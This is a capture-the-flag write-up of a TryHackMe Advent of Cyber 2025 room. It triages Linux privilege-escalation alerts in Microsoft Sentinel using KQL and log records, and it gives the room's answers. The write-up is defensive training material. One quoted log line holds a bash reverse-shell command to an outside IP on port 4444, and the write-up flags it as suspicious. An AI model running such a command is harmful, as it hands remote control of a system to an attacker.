```
▞▀▖▞▀▖▞▀▖ ▞▀▖▜       ▐   ▀▛▘  ▗       ▗            ▀▛▘▗          ▜  ▀▛▘  ▗          
▚▄ ▌ ▌▌   ▙▄▌▐ ▞▀▖▙▀▖▜▀   ▌▙▀▖▄ ▝▀▖▞▀▌▄ ▛▀▖▞▀▌ ▄▄▖  ▌ ▄ ▛▀▖▞▀▘▞▀▖▐   ▌▙▀▖▄ ▝▀▖▞▀▌▞▀▖
▖ ▌▌ ▌▌ ▖ ▌ ▌▐ ▛▀ ▌  ▐ ▖  ▌▌  ▐ ▞▀▌▚▄▌▐ ▌ ▌▚▄▌      ▌ ▐ ▌ ▌▝▀▖▛▀ ▐   ▌▌  ▐ ▞▀▌▚▄▌▛▀ 
▝▀ ▝▀ ▝▀  ▘ ▘ ▘▝▀▘▘   ▀   ▘▘  ▀▘▝▀▘▗▄▘▀▘▘ ▘▗▄▘      ▘ ▀▘▘ ▘▀▀ ▝▀▘ ▘  ▘▘  ▀▘▝▀▘▗▄▘▝▀▘
```
In this THM room from the Advent of Cyber 2025 event, we investigate and triage alerts
through Microsoft Sentinel. [^1]

How many entities are affected by the Linux PrivEsc Polkit exploit attempt?
-----------------------------------------------------------------------------------------
The content deployment is located in the Microsoft Azure portal [^2] where we can log in
with one of the usernames and temporary access passwords according to our location. At
first, we get comfortable with the Azure Services and open the Microsoft Sentinel, where
there is one such entry that upon opening lets us browse several threat management tools.
Here, we are interested in the logs and in the table symbol we can select a custom query
`Syslog_CL` that is of particular interest for us.
In Microsoft Sentinel, a *Security Information and Event Management* (SIEM) and *Security
Orchestration, Automation and Response* (SOAR) system, we can further investigate the
incidents in the treat management of the defender portal. Here, we search for the "Linux
PrivEsc Polkit Exploit Attempt" and see that there are *10 assets*, who were affected in
two alerts that affected five devices each. The exposure level of all 10 devices is low
and the risk level is none because the incident is a sign of a potential privilege
escalation attempt that was not successful.

What is the severity of the Linux PrivEsc: Sudo Shadow Access alert?
-----------------------------------------------------------------------------------------
Again, we search for "Linux PrivEsc: Sudo Shadow Access" alert, and discover two such
incidents with the ID 1547 and 1552. This indicates that there were two different stages
of intrusion. In both cases, they are classified with a *high* priority due to the
occurence of sudo commands that read or modify `/etc/shadow` or set SUID bits.

How many accounts were added to the sudoers group in the according alert?
-----------------------------------------------------------------------------------------
For this task, we search for the "Linux PrivEsc: User Added to Sudo Group" alert and
upon clicking on the incident graph, we can see that there were *4 users* associated to
11 devices in the sudoers group. The names of the users are "backupuser", "serviceacct",
"deploy" and "alice".

What is the name of the kernel module installed in websrv-01?
-----------------------------------------------------------------------------------------
Starting from now, we want to perform an in-depth log analysis to validate the alerts and
uncover the exact attacker actions that triggered them for the "Linux PrivEsc: Kernel
Module Insertion" incident. In the Microsoft Defender view of the incidents listing, we
have to click on the alert and then on "advanced hunting" to be able to run a query that
prints all the records. Upon doing this, we find the listing with `websrv-01` host and we
can clicking on the full message.
```
kernel: [625465] audit: type=1130 audit(1759996669:1161): id=622 op=insert_module name=malicious_mod.ko uid=0
```
The *Kusto Query Language* (KQL) query that was automatically prompted to result in the
listing of kernel modules in `websrv-01` is as follows. Here, we can see that the name of
the kernel model that was installed on the `websrv-01` is *malicious_mod.ko*.
```kql
set query_now = datetime(2025-10-30T05:09:25.9886229Z);
Syslog_CL
| where program_s == 'kernel' and Message has 'insert_module'
| project TimeGenerated, host_s, Message
```

What is the unusual command executed within websrv-01 by the ops user?
-----------------------------------------------------------------------------------------
For this task, we want to set the host to the `websrv-01` and then print all the messages
to find a potential command.
```kql
set query_now = datetime(2025-10-30T05:09:25.9886229Z);
Syslog_CL
| where host_s == 'websrv-01'
| project _timestamp_t, host_s, Message
```
With this query, we get a table with 14 entries, and there is exactly one message that
shows a command execution from the user "ops" as follows. The command is suspicious since
it appears to establish connection to a reverse shell on port 4444.
```
sudo: ops : TTY=pts/0 ; PWD=/home/ops ; USER=root ; COMMAND=/bin/bash -i >& /dev/tcp/198.51.100.22/4444 0>&1
```

What is the source IP address of the first successful SSH login to storage-01?
-----------------------------------------------------------------------------------------
For this task, we simply change the `host_s` to `storage-01` and run the query to get a
list of all messages once again. Since, we are interested in a successful SSH login, the
message `sshd[3496]: Accepted password for root from 172.16.0.12 port 12020 ssh2` is of
particular interest to us. And indeed, with this we have found the source IP address of
the first SSH login.

What is the external source IP that successfully logged in as root to app-01?
-----------------------------------------------------------------------------------------
We know the drill, we change the `host_s` to `app-01` and upon inspecting the record list
we discover two SSH messages, with the first one being from an external source IP address
and therefore the one we want to provide for the flag.
```
sshd[6978]: Accepted password for root from 203.0.113.45 port 64978 ssh2
sshd[4770]: Accepted password for root from 10.1.1.5 port 2252 ssh2
```

What is the name of the user added to the sudoers group inside app-01?
-----------------------------------------------------------------------------------------
From the previous incident messages listing, we can find the user that was added to the
sudoers group inside `app-01` easily. It is found in the following record:
`usermod: user 'deploy' added to group 'sudo' by uid=0 (usermod -aG sudo deploy)`

[^1]: https://tryhackme.com/room/azuresentinel-aoc2025-a7d3h9k0p2
[^2]: https://portal.azure.com/
